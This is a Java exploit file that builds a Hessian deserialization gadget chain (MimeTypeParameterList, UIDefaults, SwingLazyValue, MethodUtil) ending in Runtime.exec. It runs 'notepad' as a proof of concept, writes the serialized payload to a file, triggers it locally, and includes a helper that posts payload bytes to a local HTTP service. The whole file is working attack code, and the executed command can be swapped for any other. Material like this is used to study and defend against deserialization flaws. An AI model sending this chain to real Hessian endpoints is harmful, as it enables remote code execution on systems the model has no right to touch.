import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import org.springframework.http.HttpEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URI;

public class Hessian_MimeTypeParameterList_SwingLazyValue_MethodUtil {
    public static void main(final String[] args) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);

        SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"notepad"}}});

        uiDefaults.put("key", slz);
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();

        setFieldValue(mimeTypeParameterList,"parameters",uiDefaults);



        File outputFile = new File("D://tmp//payload.bin");
        FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        baos.write(67);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(mimeTypeParameterList);
        output.flushBuffer();
        fileOutputStream.write(baos.toByteArray());
        fileOutputStream.flush();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    //序列化为bin文件
    public static void serialize(Object o) throws NoSuchFieldException, IllegalAccessException, IOException {
        FileOutputStream fos = new FileOutputStream(new File("ser.bin"));
        Hessian2Output output = new Hessian2Output(fos);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(o);
    }

    //bin文件反序列化
    public static void deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("ser.bin"));
        new Hessian2Input(fis).readObject();
    }

    public static void doPOST(byte[] obj) throws Exception{
        URI url = new URI("http://127.0.0.1:8090/");
        HttpEntity<byte[]> requestEntity = new HttpEntity<>(obj);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getBody());
    }
}